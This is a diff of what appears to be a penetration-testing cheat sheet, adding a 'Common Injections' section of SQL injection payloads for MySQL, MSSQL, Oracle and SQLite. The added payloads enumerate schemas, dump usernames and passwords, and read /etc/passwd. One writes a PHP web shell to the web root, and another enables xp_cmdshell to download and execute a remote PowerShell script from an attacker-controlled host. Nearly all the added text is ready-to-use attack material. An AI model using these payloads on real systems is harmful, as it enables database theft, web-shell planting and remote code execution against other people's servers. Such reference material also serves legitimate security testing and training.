@@ -2036,20 +2036,12 @@ enum_impersonate
 impacket-mssqlclient <USERNAME>@<RHOST>
 impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
 impacket-mssqlclient -k -no-pass <RHOST>
-sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
+impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
 ```
 
 ```c
 export KRB5CCNAME=<USERNAME>.ccache
 impacket-mssqlclient -k <RHOST>.<DOMAIN>
-```
-
-##### Privilege Escalation
-
-```c
-exec_as_login sa
-enable_xp_cmdshell
-xp_cmdshell whoami
 ```
 
 #### MongoDB
@@ -2082,8 +2074,17 @@ mongo "mongodb://localhost:27017"
 ##### Connection
 
 ```c
-sqlcmd -S <RHOST> -U <USERNAME>
 sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
+impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth
+```
+
+##### Common Commands
+
+```c
+SELECT @@version;
+SELECT name FROM sys.databases;
+SELECT * FROM <DATABASE>.information_schema.tables;
+SELECT * FROM <DATABASE>.dbo.users;
 ```
 
 ##### Show Database Content
@@ -2168,13 +2169,18 @@ mysql -u <USERNAME> -h <RHOST> -p
 ```
 
 ```c
-mysql> show databases;
-mysql> use <DATABASE>;
-mysql> show tables;
-mysql> describe <TABLE>;
+mysql> STATUS;
+mysql> SHOW databases;
+mysql> USE <DATABASE>;
+mysql> SHOW tables;
+mysql> DESCRIBE <TABLE>;
+mysql> SELECT version();
+mysql> SELECT system_user();
 mysql> SELECT * FROM Users;
 mysql> SELECT * FROM users \G;
 mysql> SELECT Username,Password FROM Users;
+musql> SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';
+mysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
 ```
 
 ##### Update User Password
@@ -2404,6 +2410,195 @@ admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+```
+
+#### Common Injections
+
+##### MySQL & MariaDB
+
+###### Get Number of Columns
+
+```c
+-1 order by 3;#
+```
+
+###### Get Version
+
+```c
+-1 union select 1,2,version();#
+```
+
+###### Get Database Name
+
+```c
+-1 union select 1,2,database();#
+```
+
+###### Get Table Name
+
+```c
+-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
+```
+
+###### Get Column Name
+
+```c
+-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
+```
+
+###### Read a File
+
+```c
+SELECT LOAD_FILE('/etc/passwd')
+```
+
+###### Dump Data
+
+```c
+-1 union select 1,2, group_concat(<COLUMN>) from <DATABASE>.<TABLE>;#
+```
+
+###### Create Webshell
+
+```c
+LOAD_FILE('/etc/httpd/conf/httpd.conf')
+select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";
+```
+
+or
+
+```c
+LOAD_FILE('/etc/httpd/conf/httpd.conf')
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
+```
+
+##### MSSQL
+
+###### Authentication Bypass
+
+```c
+' or 1=1--
+```
+
+###### Get Version with Time-Based Injection
+
+```c
+' SELECT @@version; WAITFOR DELAY '00:00:10'; —
+```
+
+###### Enable xp_cmdshell
+
+```c
+' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+```
+
+###### Remote Code Execution (RCE)
+
+```c
+' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
+```
+
+##### Orcale SQL
+
+###### Authentication Bypass
+
+```c
+' or 1=1--
+```
+
+###### Get Number of Columns
+
+```c
+' order by 3--
+```
+
+###### Get Table Name
+
+```c
+' union select null,table_name,null from all_tables--
+```
+
+###### Get Column Name
+
+```c
+' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
+```
+
+###### Dump Data
+
+```c
+' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
+```
+
+##### SQLite
+
+###### Extracting Table Names
+
+```c
+http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
+```
+
+###### Extracting User Table
+
+```c
+http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
+```
+
+##### Error-based SQL Injection (SQLi)
+
+```c
+<USERNAME>' OR 1=1 -- //
+```
+
+Results in:
+
+```c
+SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
+```
+
+```c
+' or 1=1 in (select @@version) -- //
+' OR 1=1 in (SELECT * FROM users) -- //
+' or 1=1 in (SELECT password FROM users) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+```
+
+##### UNION-based SQL Injection (SQLi)
+
+###### Manual Injection Steps
+
+```c
+$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search_input"]."%'";
+```
+
+```c
+' ORDER BY 1-- //
+```
+
+```c
+%' UNION SELECT database(), user(), @@version, null, null -- //
+```
+
+```c
+' UNION SELECT null, null, database(), user(), @@version  -- //
+```
+
+```c
+' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
+```
+
+```c
+' UNION SELECT null, username, password, description, null FROM users -- //
+```
+
+##### Blind SQL Injection (SQLi)
+
+```c
+http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
+```
+
+```c
+http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
 ```
 
 #### SQL Truncation Attack
